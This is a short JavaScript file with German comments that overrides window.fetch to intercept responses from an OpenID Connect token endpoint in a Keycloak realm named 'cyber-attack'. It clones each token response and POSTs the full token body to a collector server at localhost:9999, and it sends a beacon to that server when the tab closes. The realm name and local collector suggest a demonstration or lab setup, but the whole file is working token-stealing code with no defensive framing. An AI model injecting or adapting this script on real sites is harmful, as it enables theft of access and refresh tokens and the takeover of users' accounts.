(function() {
    const originalFetch = window.fetch;

    // Alle HTTP-Request abfangen
    window.fetch = function(...args) {
        const requestURI = args[0].href;
        // Man in the middle bei Token-Endpoint
        if (requestURI && requestURI.includes('/realms/cyber-attack/protocol/openid-connect/token')) {
            return originalFetch.apply(this, args).then(response => {
                const clonedResponse = response.clone();

                clonedResponse.json().then(body => {
                    fetch('http://localhost:9999/rest/receive-token-body', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(body),
                    }).then(() => {
                        console.log('Token-Body erfolgreich an den Server gesendet.');
                    }).catch(error => {
                        console.error('Fehler beim Senden des Token-Body an den Server:', error);
                    });
                }).catch(error => {
                    console.error('Fehler beim Lesen des Response-Body:', error);
                });

                return response;
            });
        } else {
            return originalFetch.apply(this, args);
        }
    };
})();

function informServerAboutTabClose() {
    navigator.sendBeacon('http://localhost:9999/rest/tab-closed', JSON.stringify({ message: 'Tab geschlossen' }));
}

window.addEventListener('beforeunload', informServerAboutTabClose);
